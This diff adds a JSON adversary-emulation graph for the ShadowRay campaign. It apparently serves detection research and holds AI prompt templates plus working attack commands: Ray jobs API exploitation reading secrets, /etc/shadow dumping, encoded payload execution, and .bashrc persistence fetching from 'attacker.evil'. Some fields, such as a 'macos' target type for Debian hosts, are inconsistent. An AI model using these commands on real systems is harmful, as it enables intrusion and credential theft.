@@ -1,0 +1,1168 @@
+{
+  "campaign_name": "ShadowRay",
+  "campaign_file": "data/caldera_adversaries/0.shadowray.yml",
+  "generated_at": "2026-02-15T16:40:59.516353",
+  "metadata": {
+    "total_techniques": 10,
+    "nodes_generated": 10,
+    "validation": {
+      "is_dag": true,
+      "cycle_detected": false,
+      "cycle_nodes": [],
+      "validation_rules": {
+        "impact_nodes_have_upstream": true,
+        "initial_access_has_no_parents": true,
+        "execution_nodes_have_path": true,
+        "all_nodes_reachable": true,
+        "no_dangling_nodes": true,
+        "prerequisites_satisfiable": false
+      },
+      "violations": [
+        {
+          "node": "T1027.013",
+          "node_id": "22d168e8-69cf-4fe6-9167-7e7b79a10a99",
+          "rule": "prerequisites_satisfiable",
+          "message": "Prerequisite 'capability:modify_system_settings' for node T1027.013 cannot be satisfied by any node in the graph"
+        },
+        {
+          "node": "T1003.008",
+          "node_id": "107a7cba-3fbf-4181-b083-f6a4fd1a3550",
+          "rule": "prerequisites_satisfiable",
+          "message": "Prerequisite 'access:target' for node T1003.008 cannot be satisfied by any node in the graph"
+        },
+        {
+          "node": "T1003.008",
+          "node_id": "107a7cba-3fbf-4181-b083-f6a4fd1a3550",
+          "rule": "prerequisites_satisfiable",
+          "message": "Prerequisite 'need:credential_material_location' for node T1003.008 cannot be satisfied by any node in the graph"
+        },
+        {
+          "node": "T1546.004",
+          "node_id": "35161caf-b5db-43cb-9fcd-3c693820e4df",
+          "rule": "prerequisites_satisfiable",
+          "message": "Prerequisite 'access:low_privilege' for node T1546.004 cannot be satisfied by any node in the graph"
+        },
+        {
+          "node": "T1546.004",
+          "node_id": "35161caf-b5db-43cb-9fcd-3c693820e4df",
+          "rule": "prerequisites_satisfiable",
+          "message": "Prerequisite 'need:privilege_escalation_vector' for node T1546.004 cannot be satisfied by any node in the graph"
+        },
+        {
+          "node": "T1105",
+          "node_id": "89cb3747-050a-4c93-83de-a7e015ec1727",
+          "rule": "prerequisites_satisfiable",
+          "message": "Prerequisite 'network:egress_allowed' for node T1105 cannot be satisfied by any node in the graph"
+        },
+        {
+          "node": "T1105",
+          "node_id": "89cb3747-050a-4c93-83de-a7e015ec1727",
+          "rule": "prerequisites_satisfiable",
+          "message": "Prerequisite 'access:initial' for node T1105 cannot be satisfied by any node in the graph"
+        },
+        {
+          "node": "T1059.006",
+          "node_id": "922d8454-e99c-42d9-b13c-b2c6d1e64edc",
+          "rule": "prerequisites_satisfiable",
+          "message": "Prerequisite 'need:execution_vector' for node T1059.006 cannot be satisfied by any node in the graph"
+        },
+        {
+          "node": "T1059.006",
+          "node_id": "922d8454-e99c-42d9-b13c-b2c6d1e64edc",
+          "rule": "prerequisites_satisfiable",
+          "message": "Prerequisite 'access:initial' for node T1059.006 cannot be satisfied by any node in the graph"
+        },
+        {
+          "node": "T1016",
+          "node_id": "88830879-618f-498a-87a6-b879ad875d21",
+          "rule": "prerequisites_satisfiable",
+          "message": "Prerequisite 'access:target' for node T1016 cannot be satisfied by any node in the graph"
+        },
+        {
+          "node": "T1068",
+          "node_id": "b35f71f1-c2e8-470d-8f64-e540f6004e52",
+          "rule": "prerequisites_satisfiable",
+          "message": "Prerequisite 'access:low_privilege' for node T1068 cannot be satisfied by any node in the graph"
+        }
+      ]
+    }
+  },
+  "structural_nodes": [
+    {
+      "node_id": "149cdfe5-7159-405a-91b8-7a57c8765425",
+      "node_index": 0,
+      "node_type": "structural",
+      "technique_id": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "tactic": "initial-access",
+      "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they may alternatively exploit exposed VMware vCenter servers. Depending on the flaw being exploited, this may also involve Exploitation for Defense Evasion or Exploitation for Client Execution.\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the Cloud Instance Metadata API), exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.",
+      "campaign_context": "During ShadowRay, threat actors exploited CVE-2023-48022 on publicly exposed Ray servers to steal computing power and to expose sensitive data.",
+      "required_prerequisites": [],
+      "provides": [
+        "initial_access",
+        "foothold"
+      ],
+      "environment_setup_commands": [
+        "sudo apt-get update && sudo apt-get install -y python3 python3-pip\n",
+        "pip3 install ray[default]==2.7.0\n",
+        "echo '#!/bin/bash\\nray start --head --port=10001 --dashboard-host=0.0.0.0 --dashboard-port=8265 --disable-usage-stats' > /tmp/start_ray.sh && chmod +x /tmp/start_ray.sh\n",
+        "/tmp/start_ray.sh\n",
+        "echo 'sensitive_api_key=sk-prod-abc123xyz789' > /tmp/secrets.txt && echo 'db_password=SuperSecret123!' >> /tmp/secrets.txt\n\n"
+      ],
+      "attacker_commands": [
+        "nmap -sS -p 8265,10001 172.21.0.20\n",
+        "curl -s \"http://172.21.0.20:8265/api/v0/nodes\" | jq .\n",
+        "curl -X POST \"http://172.21.0.20:8265/api/v0/jobs/\" -H \"Content-Type: application/json\" -d '{\"entrypoint\": \"python -c \\\"import os; print(os.listdir('/tmp'))\\\"\", \"runtime_env\": {}, \"job_id\": null, \"metadata\": {\"job_name\": \"recon_job\"}}'\n",
+        "curl -X POST \"http://172.21.0.20:8265/api/v0/jobs/\" -H \"Content-Type: application/json\" -d '{\"entrypoint\": \"python -c \\\"import subprocess; result=subprocess.run(['/bin/cat', '/tmp/secrets.txt'], capture_output=True, text=True); print(result.stdout)\\\"\", \"runtime_env\": {}, \"job_id\": null, \"metadata\": {\"job_name\": \"data_exfil\"}}'\n",
+        "curl -X POST \"http://172.21.0.20:8265/api/v0/jobs/\" -H \"Content-Type: application/json\" -d '{\"entrypoint\": \"python -c \\\"import subprocess; subprocess.run(['/bin/bash', '-c', 'id; whoami; uname -a'], check=True)\\\"\", \"runtime_env\": {}, \"job_id\": null, \"metadata\": {\"job_name\": \"system_info\"}}'"
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Attacker can directly access Host A (from pre-prompt)",
+      "parent_nodes": [],
+      "child_nodes": [
+        "89cb3747-050a-4c93-83de-a7e015ec1727",
+        "88830879-618f-498a-87a6-b879ad875d21"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively for defensive security research, adversary emulation, and detection engineering evaluation. \nAll activities occur on systems owned and authorized for testing. \nNo real-world exploitation or unauthorized activity is intended.\n\nThe purpose is to evaluate behavioral fidelity and telemetry generation aligned with MITRE ATT&CK techniques.\n\nYou are operating in a controlled adversary emulation laboratory for detection research.\n\nInfrastructure Model:\n- Attacker: Kali Linux with network access to Host A.\n- Host A: GNU/Linux Debian 13 (initial target), ip address: 172.21.0.20.\n- Host B: GNU/Linux Debian 13 reachable from Host A only.\n\nNetwork Assumptions:\n- Kali can directly access Host A.\n- Kali does NOT directly access Host B.\n- Host B can only be accessed through Host A.\n\nExecution Constraints:\n- Generate commands ONLY for execution on Kali Linux.\n- Do NOT generate commands intended to be executed directly on Host A or Host B.\n- You may describe required vulnerabilities or misconfigurations on Host A or Host B.\n- If the vulnerability is placed on Host B, it must be reachable through Host A in a realistic manner.\n\nObjective:\nFor the specified MITRE ATT&CK technique, generate:\n\n1) ATTACKER_COMMAND:\n   Shell command(s) executed from Kali Linux that reproduce the behavioral characteristics of the technique.\n\n2) TARGET_VULNERABILITY:\n   A realistic vulnerability or misconfiguration that must exist on Host A or Host B to enable the attack behavior.\n   If placed on Host B, access must logically occur via Host A.\n\nBehavioral Requirements:\n- Preserve strict fidelity to the MITRE ATT&CK technique behavior.\n- Maintain realistic adversary tradecraft.\n- Commands must be technically valid on Kali Linux.\n- Assume Host A and Host B run default Debian 13 unless otherwise specified.\n- Do not assume additional non-default tools on the target unless explicitly stated.\n\nTelemetry Awareness Requirements:\n- The attack must generate observable system artifacts consistent with real-world adversary activity.\n- Do not intentionally suppress logging unless the MITRE technique explicitly involves defense evasion.\n- Prefer behaviors that naturally produce process execution, network connections, authentication events, file access, or service interaction telemetry.\n- The objective includes enabling measurable telemetry collection for detection evaluation.\n\nOutput strictly in this format:\n\nATTACKER_COMMAND:\n<command(s)>\n\nTARGET_VULNERABILITY:\n<description>\n\n================================================================================\n\nTECHNIQUE: T1190 - Exploit Public-Facing Application\nTACTIC: initial-access\nCAMPAIGN CONTEXT: During ShadowRay, threat actors exploited CVE-2023-48022 on publicly exposed Ray servers to steal computing power and to expose sensitive data.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they may alternatively exploit exposed VMware vCenter servers. Depending on the flaw being exploited, this may also involve Exploitation for Defense Evasion or Exploitation for Client Execution.\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the Cloud Instance Metadata API), exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.\n\nFor this MITRE ATT&CK technique, generate TWO sets of commands:\n\n1) ENVIRONMENT_SETUP_COMMANDS:\n   Commands to run on the TARGET system to create the vulnerability/misconfiguration\n   that enables this technique. These prepare the environment for the attack.\n   \n   Output each command as:\n   SETUP_CMD: <command to run on target>\n   SETUP_DESC: <brief description>\n\n2) ATTACKER_COMMANDS:\n   Shell command(s) executed from Kali Linux that exploit the prepared environment\n   and reproduce the behavioral characteristics of the technique.\n   \n   Output each command as:\n   ATTACK_CMD: <command to run from Kali>\n   ATTACK_DESC: <brief description>\n\nOutput strictly in this format:\n\nENVIRONMENT_SETUP_COMMANDS:\nSETUP_CMD: <command 1>\nSETUP_DESC: <description 1>\nSETUP_CMD: <command 2>\nSETUP_DESC: <description 2>\n\nATTACKER_COMMANDS:\nATTACK_CMD: <command 1>\nATTACK_DESC: <description 1>\nATTACK_CMD: <command 2>\nATTACK_DESC: <description 2>",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "22d168e8-69cf-4fe6-9167-7e7b79a10a99",
+      "node_index": 1,
+      "node_type": "structural",
+      "technique_id": "T1027.013",
+      "technique_name": "Encrypted/Encoded File",
+      "tactic": "defense-evasion",
+      "description": "Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
+      "campaign_context": "During ShadowRay, threat actors used Base64-encrypted Python code to evade detection.",
+      "required_prerequisites": [
+        "capability:modify_system_settings"
+      ],
+      "provides": [
+        "evasion_capability"
+      ],
+      "environment_setup_commands": [
+        "mkdir -p /tmp/staging && cd /tmp/staging",
+        "echo '#!/bin/bash' > /tmp/staging/collect.sh && echo 'whoami > /tmp/user.txt' >> /tmp/staging/collect.sh && echo 'id >> /tmp/user.txt' >> /tmp/staging/collect.sh && echo 'ps aux >> /tmp/processes.txt' >> /tmp/staging/collect.sh && chmod +x /tmp/staging/collect.sh",
+        "python3 -c \"import base64; open('/tmp/staging/payload.b64', 'wb').write(base64.b64encode(open('/tmp/staging/collect.sh', 'rb').read()))\"",
+        "openssl enc -aes-256-cbc -salt -in /tmp/staging/collect.sh -out /tmp/staging/payload.enc -k \"ShadowRay2024\" -pbkdf2",
+        "systemctl start ssh && systemctl enable ssh\n\n"
+      ],
+      "attacker_commands": [
+        "echo \"#!/bin/bash\" > encrypted_payload.sh && echo \"sshpass -p 'password' scp root@172.21.0.20:/tmp/staging/payload.b64 ./payload.b64\" >> encrypted_payload.sh && echo \"sshpass -p 'password' scp root@172.21.0.20:/tmp/staging/payload.enc ./payload.enc\" >> encrypted_payload.sh && chmod +x encrypted_payload.sh && ./encrypted_payload.sh",
+        "base64 -d payload.b64 > decoded_payload.sh && file decoded_payload.sh",
+        "openssl enc -aes-256-cbc -d -in payload.enc -out decrypted_payload.sh -k \"ShadowRay2024\" -pbkdf2 && file decrypted_payload.sh",
+        "sshpass -p 'password' ssh root@172.21.0.20 \"python3 -c \\\"import base64; exec(compile(base64.b64decode(open('/tmp/staging/payload.b64', 'rb').read()), '<string>', 'exec'))\\\"\""
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [],
+      "child_nodes": [],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively for defensive security research, adversary emulation, and detection engineering evaluation. \nAll activities occur on systems owned and authorized for testing. \nNo real-world exploitation or unauthorized activity is intended.\n\nThe purpose is to evaluate behavioral fidelity and telemetry generation aligned with MITRE ATT&CK techniques.\n\nYou are operating in a controlled adversary emulation laboratory for detection research.\n\nInfrastructure Model:\n- Attacker: Kali Linux with network access to Host A.\n- Host A: GNU/Linux Debian 13 (initial target), ip address: 172.21.0.20.\n- Host B: GNU/Linux Debian 13 reachable from Host A only.\n\nNetwork Assumptions:\n- Kali can directly access Host A.\n- Kali does NOT directly access Host B.\n- Host B can only be accessed through Host A.\n\nExecution Constraints:\n- Generate commands ONLY for execution on Kali Linux.\n- Do NOT generate commands intended to be executed directly on Host A or Host B.\n- You may describe required vulnerabilities or misconfigurations on Host A or Host B.\n- If the vulnerability is placed on Host B, it must be reachable through Host A in a realistic manner.\n\nObjective:\nFor the specified MITRE ATT&CK technique, generate:\n\n1) ATTACKER_COMMAND:\n   Shell command(s) executed from Kali Linux that reproduce the behavioral characteristics of the technique.\n\n2) TARGET_VULNERABILITY:\n   A realistic vulnerability or misconfiguration that must exist on Host A or Host B to enable the attack behavior.\n   If placed on Host B, access must logically occur via Host A.\n\nBehavioral Requirements:\n- Preserve strict fidelity to the MITRE ATT&CK technique behavior.\n- Maintain realistic adversary tradecraft.\n- Commands must be technically valid on Kali Linux.\n- Assume Host A and Host B run default Debian 13 unless otherwise specified.\n- Do not assume additional non-default tools on the target unless explicitly stated.\n\nTelemetry Awareness Requirements:\n- The attack must generate observable system artifacts consistent with real-world adversary activity.\n- Do not intentionally suppress logging unless the MITRE technique explicitly involves defense evasion.\n- Prefer behaviors that naturally produce process execution, network connections, authentication events, file access, or service interaction telemetry.\n- The objective includes enabling measurable telemetry collection for detection evaluation.\n\nOutput strictly in this format:\n\nATTACKER_COMMAND:\n<command(s)>\n\nTARGET_VULNERABILITY:\n<description>\n\n================================================================================\n\nTECHNIQUE: T1027.013 - Encrypted/Encoded File\nTACTIC: defense-evasion\nCAMPAIGN CONTEXT: During ShadowRay, threat actors used Base64-encrypted Python code to evade detection.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.\n\nFor this MITRE ATT&CK technique, generate TWO sets of commands:\n\n1) ENVIRONMENT_SETUP_COMMANDS:\n   Commands to run on the TARGET system to create the vulnerability/misconfiguration\n   that enables this technique. These prepare the environment for the attack.\n   \n   Output each command as:\n   SETUP_CMD: <command to run on target>\n   SETUP_DESC: <brief description>\n\n2) ATTACKER_COMMANDS:\n   Shell command(s) executed from Kali Linux that exploit the prepared environment\n   and reproduce the behavioral characteristics of the technique.\n   \n   Output each command as:\n   ATTACK_CMD: <command to run from Kali>\n   ATTACK_DESC: <brief description>\n\nOutput strictly in this format:\n\nENVIRONMENT_SETUP_COMMANDS:\nSETUP_CMD: <command 1>\nSETUP_DESC: <description 1>\nSETUP_CMD: <command 2>\nSETUP_DESC: <description 2>\n\nATTACKER_COMMANDS:\nATTACK_CMD: <command 1>\nATTACK_DESC: <description 1>\nATTACK_CMD: <command 2>\nATTACK_DESC: <description 2>",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications",
+        "Must evade default detection mechanisms"
+      ],
+      "cleanup_template": "Restore original configurations",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "capability:modify_system_settings"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "107a7cba-3fbf-4181-b083-f6a4fd1a3550",
+      "node_index": 2,
+      "node_type": "structural",
+      "technique_id": "T1003.008",
+      "technique_name": "/etc/passwd and /etc/shadow",
+      "tactic": "credential-access",
+      "description": "Adversaries may attempt to dump the contents of /etc/passwd and /etc/shadow to enable offline password cracking. Most modern Linux operating systems use a combination of /etc/passwd and /etc/shadow to store user account information, including password hashes in /etc/shadow. By default, /etc/shadow is only readable by the root user.\nLinux stores user information such as user ID, group ID, home directory path, and login shell in /etc/passwd. A \"user\" on the system may belong to a person or a service. All password hashes are stored in /etc/shadow - including entries for users with no passwords and users with locked or disabled accounts.\nAdversaries may attempt to read or dump the /etc/passwd and /etc/shadow files on Linux systems via command line utilities such as the cat command. Additionally, the Linux utility unshadow can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper - for example, via the command /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db. Since the user information stored in /etc/passwd are linked to the password hashes in /etc/shadow, an adversary would need to have access to both.",
+      "campaign_context": "During ShadowRay, threat actors used `cat /etc/shadow` to steal password hashes.",
+      "required_prerequisites": [
+        "access:target",
+        "need:credential_material_location"
+      ],
+      "provides": [
+        "password_hashes",
+        "credentials",
+        "secrets"
+      ],
+      "environment_setup_commands": [
+        "chmod 644 /etc/shadow",
+        "useradd -m -p '$6$salt$hash' testuser1\n\n"
+      ],
+      "attacker_commands": [
+        "ssh root@172.21.0.20 \"cat /etc/passwd\"",
+        "ssh root@172.21.0.20 \"cat /etc/shadow\"",
+        "ssh root@172.21.0.20 \"cat /etc/passwd\" > /tmp/passwd.txt && ssh root@172.21.0.20 \"cat /etc/shadow\" > /tmp/shadow.txt",
+        "unshadow /tmp/passwd.txt /tmp/shadow.txt > /tmp/crack.password.db"
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [],
+      "child_nodes": [],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively for defensive security research, adversary emulation, and detection engineering evaluation. \nAll activities occur on systems owned and authorized for testing. \nNo real-world exploitation or unauthorized activity is intended.\n\nThe purpose is to evaluate behavioral fidelity and telemetry generation aligned with MITRE ATT&CK techniques.\n\nYou are operating in a controlled adversary emulation laboratory for detection research.\n\nInfrastructure Model:\n- Attacker: Kali Linux with network access to Host A.\n- Host A: GNU/Linux Debian 13 (initial target), ip address: 172.21.0.20.\n- Host B: GNU/Linux Debian 13 reachable from Host A only.\n\nNetwork Assumptions:\n- Kali can directly access Host A.\n- Kali does NOT directly access Host B.\n- Host B can only be accessed through Host A.\n\nExecution Constraints:\n- Generate commands ONLY for execution on Kali Linux.\n- Do NOT generate commands intended to be executed directly on Host A or Host B.\n- You may describe required vulnerabilities or misconfigurations on Host A or Host B.\n- If the vulnerability is placed on Host B, it must be reachable through Host A in a realistic manner.\n\nObjective:\nFor the specified MITRE ATT&CK technique, generate:\n\n1) ATTACKER_COMMAND:\n   Shell command(s) executed from Kali Linux that reproduce the behavioral characteristics of the technique.\n\n2) TARGET_VULNERABILITY:\n   A realistic vulnerability or misconfiguration that must exist on Host A or Host B to enable the attack behavior.\n   If placed on Host B, access must logically occur via Host A.\n\nBehavioral Requirements:\n- Preserve strict fidelity to the MITRE ATT&CK technique behavior.\n- Maintain realistic adversary tradecraft.\n- Commands must be technically valid on Kali Linux.\n- Assume Host A and Host B run default Debian 13 unless otherwise specified.\n- Do not assume additional non-default tools on the target unless explicitly stated.\n\nTelemetry Awareness Requirements:\n- The attack must generate observable system artifacts consistent with real-world adversary activity.\n- Do not intentionally suppress logging unless the MITRE technique explicitly involves defense evasion.\n- Prefer behaviors that naturally produce process execution, network connections, authentication events, file access, or service interaction telemetry.\n- The objective includes enabling measurable telemetry collection for detection evaluation.\n\nOutput strictly in this format:\n\nATTACKER_COMMAND:\n<command(s)>\n\nTARGET_VULNERABILITY:\n<description>\n\n================================================================================\n\nTECHNIQUE: T1003.008 - /etc/passwd and /etc/shadow\nTACTIC: credential-access\nCAMPAIGN CONTEXT: During ShadowRay, threat actors used `cat /etc/shadow` to steal password hashes.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may attempt to dump the contents of /etc/passwd and /etc/shadow to enable offline password cracking. Most modern Linux operating systems use a combination of /etc/passwd and /etc/shadow to store user account information, including password hashes in /etc/shadow. By default, /etc/shadow is only readable by the root user.\nLinux stores user information such as user ID, group ID, home directory path, and login shell in /etc/passwd. A \"user\" on the system may belong to a person or a service. All password hashes are stored in /etc/shadow - including entries for users with no passwords and users with locked or disabled accounts.\nAdversaries may attempt to read or dump the /etc/passwd and /etc/shadow files on Linux systems via command line utilities such as the cat command. Additionally, the Linux utility unshadow can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper - for example, via the command /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db. Since the user information stored in /etc/passwd are linked to the password hashes in /etc/shadow, an adversary would need to have access to both.\n\nFor this MITRE ATT&CK technique, generate TWO sets of commands:\n\n1) ENVIRONMENT_SETUP_COMMANDS:\n   Commands to run on the TARGET system to create the vulnerability/misconfiguration\n   that enables this technique. These prepare the environment for the attack.\n   \n   Output each command as:\n   SETUP_CMD: <command to run on target>\n   SETUP_DESC: <brief description>\n\n2) ATTACKER_COMMANDS:\n   Shell command(s) executed from Kali Linux that exploit the prepared environment\n   and reproduce the behavioral characteristics of the technique.\n   \n   Output each command as:\n   ATTACK_CMD: <command to run from Kali>\n   ATTACK_DESC: <brief description>\n\nOutput strictly in this format:\n\nENVIRONMENT_SETUP_COMMANDS:\nSETUP_CMD: <command 1>\nSETUP_DESC: <description 1>\nSETUP_CMD: <command 2>\nSETUP_DESC: <description 2>\n\nATTACKER_COMMANDS:\nATTACK_CMD: <command 1>\nATTACK_DESC: <description 1>\nATTACK_CMD: <command 2>\nATTACK_DESC: <description 2>",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications",
+        "Must not corrupt credential stores"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "access:target",
+        "need:credential_material_location"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "35161caf-b5db-43cb-9fcd-3c693820e4df",
+      "node_index": 3,
+      "node_type": "structural",
+      "technique_id": "T1546.004",
+      "technique_name": "Unix Shell Configuration Modification",
+      "tactic": "privilege-escalation",
+      "description": "Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely. Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution. Adversaries have also leveraged the ~/.bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session. \nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin. The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.",
+      "campaign_context": "During ShadowRay, threat actors executed commands on interactive and reverse shells.",
+      "required_prerequisites": [
+        "access:low_privilege",
+        "need:privilege_escalation_vector"
+      ],
+      "provides": [
+        "privileged_access",
+        "higher_privileges"
+      ],
+      "environment_setup_commands": [
+        "useradd -m -s /bin/bash testuser",
+        "echo 'testuser:weakpass123' | chpasswd",
+        "apt-get update && apt-get install -y openssh-server",
+        "systemctl start ssh && systemctl enable ssh",
+        "chmod 755 /home/testuser\n\n"
+      ],
+      "attacker_commands": [
+        "sshpass -p 'weakpass123' ssh testuser@172.21.0.20 'echo \"curl -s http://attacker.evil/backdoor.sh | bash\" >> ~/.bashrc'",
+        "sshpass -p 'weakpass123' ssh testuser@172.21.0.20 'echo \"# System update check\" >> ~/.bash_profile && echo \"wget -q -O /tmp/update.sh http://attacker.evil/payload.sh && chmod +x /tmp/update.sh && /tmp/update.sh &\" >> ~/.bash_profile'",
+        "sshpass -p 'weakpass123' ssh testuser@172.21.0.20 'echo \"history -c && history -w\" >> ~/.bash_logout'",
+        "sshpass -p 'weakpass123' ssh testuser@172.21.0.20 'cat ~/.bashrc ~/.bash_profile ~/.bash_logout'"
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [],
+      "child_nodes": [
+        "ea7046a1-c35e-46af-9a78-ad31b2027374"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively for defensive security research, adversary emulation, and detection engineering evaluation. \nAll activities occur on systems owned and authorized for testing. \nNo real-world exploitation or unauthorized activity is intended.\n\nThe purpose is to evaluate behavioral fidelity and telemetry generation aligned with MITRE ATT&CK techniques.\n\nYou are operating in a controlled adversary emulation laboratory for detection research.\n\nInfrastructure Model:\n- Attacker: Kali Linux with network access to Host A.\n- Host A: GNU/Linux Debian 13 (initial target), ip address: 172.21.0.20.\n- Host B: GNU/Linux Debian 13 reachable from Host A only.\n\nNetwork Assumptions:\n- Kali can directly access Host A.\n- Kali does NOT directly access Host B.\n- Host B can only be accessed through Host A.\n\nExecution Constraints:\n- Generate commands ONLY for execution on Kali Linux.\n- Do NOT generate commands intended to be executed directly on Host A or Host B.\n- You may describe required vulnerabilities or misconfigurations on Host A or Host B.\n- If the vulnerability is placed on Host B, it must be reachable through Host A in a realistic manner.\n\nObjective:\nFor the specified MITRE ATT&CK technique, generate:\n\n1) ATTACKER_COMMAND:\n   Shell 